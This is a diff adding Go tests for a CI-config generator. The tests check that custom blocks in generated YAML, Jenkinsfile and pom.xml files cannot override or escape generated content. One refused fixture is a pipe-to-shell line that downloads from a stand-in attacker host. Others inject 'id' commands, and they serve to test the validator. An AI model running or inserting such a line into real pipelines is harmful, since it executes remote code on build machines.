@@ -218,3 +218,81 @@ func TestUnifiedDiff(t *testing.T) {
 		t.Fatalf("new file diff:\n%s", got)
 	}
 }
+
+// customize writes an existing file whose custom block holds the given lines.
+func withCustom(t *testing.T, f providers.GeneratedFile, lines ...string) []byte {
+	t.Helper()
+	out, err := render.Finalize(f, "renvoy.yaml", nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	placeholder := f.Comment + " Provider-specific content retained during regeneration." + f.CommentEnd + "\n"
+	if !strings.Contains(string(out), placeholder) {
+		t.Fatalf("no placeholder in:\n%s", out)
+	}
+	return []byte(strings.Replace(string(out), placeholder, strings.Join(lines, "\n")+"\n", 1))
+}
+
+// Custom content may add to a file but never change what renvoy.yaml generated;
+// otherwise `renvoy diff` would report a modified pipeline as up to date.
+func TestCustomBlocksCannotChangeGeneratedContent(t *testing.T) {
+	yamlFile := providers.GeneratedFile{Path: "ci.yml", Comment: "#", YAML: true,
+		Content: []byte("unit:\n  script:\n    - echo hi\n\n" + render.CustomBlock("#", ""))}
+	groovy := providers.GeneratedFile{Path: "Jenkinsfile", Comment: "//",
+		Content: []byte("pipeline {\n    agent none\n" + render.CustomBlock("//", "    ") + "}\n")}
+	xmlFile := providers.GeneratedFile{Path: "pom.xml", Comment: "<!--", CommentEnd: " -->",
+		Content: []byte("<project>\n  <dependencies>\n    <!-- renvoy:begin custom -->\n    <!-- Provider-specific content retained during regeneration. -->\n    <!-- renvoy:end custom -->\n  </dependencies>\n</project>\n")}
+
+	refused := map[string]struct {
+		f     providers.GeneratedFile
+		lines []string
+	}{
+		"yaml splice into job":   {yamlFile, []string{"    - curl https://evil.example/x | sh"}},
+		"yaml override key":      {yamlFile, []string{"unit:", "  script: [id]"}},
+		"yaml second document":   {yamlFile, []string{"---", "extra: plan"}},
+		"groovy closes pipeline": {groovy, []string{"}", "node { sh 'id' }", "pipeline {"}},
+		"groovy unbalanced":      {groovy, []string{"post { always { echo 'x' }"}},
+		"xml closes parent":      {xmlFile, []string{"</dependencies><build/><dependencies>"}},
+	}
+	for name, c := range refused {
+		existing := withCustom(t, c.f, c.lines...)
+		if _, err := render.Finalize(c.f, "renvoy.yaml", existing); err == nil {
+			t.Errorf("%s: custom content was accepted", name)
+		}
+	}
+
+	accepted := map[string]struct {
+		f     providers.GeneratedFile
+		lines []string
+	}{
+		"yaml new key":      {yamlFile, []string{"extra-job:", "  script: [make extra]"}},
+		"groovy post block": {groovy, []string{"    post {", "        always { echo 'done } {' }", "    }"}},
+		"xml dependency":    {xmlFile, []string{"    <dependency><groupId>a</groupId></dependency>"}},
+	}
+	for name, c := range accepted {
+		existing := withCustom(t, c.f, c.lines...)
+		if _, err := render.Finalize(c.f, "renvoy.yaml", existing); err != nil {
+			t.Errorf("%s: legitimate custom content was refused: %v", name, err)
+		}
+	}
+}
+
+func TestMarkerCaseVariantsAreRefused(t *testing.T) {
+	root := t.TempDir()
+	if err := os.MkdirAll(filepath.Join(root, "ci"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	content := "# Renvoy:begin custom\nkeep: me\n# Renvoy:end custom\n"
+	if err := os.WriteFile(filepath.Join(root, "ci", "out.yml"), []byte(content), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if _, c := plan(t, root, file("a: 1"), true); len(c) != 1 {
+		t.Fatalf("a case-variant marker must block --force, got %v", c)
+	}
+}
+
+func TestSafeSourceIsXMLCommentSafe(t *testing.T) {
+	if got := render.SafeSource("my--ci---x.yaml"); got != "my-ci-x.yaml" {
+		t.Fatalf("SafeSource = %q", got)
+	}
+}
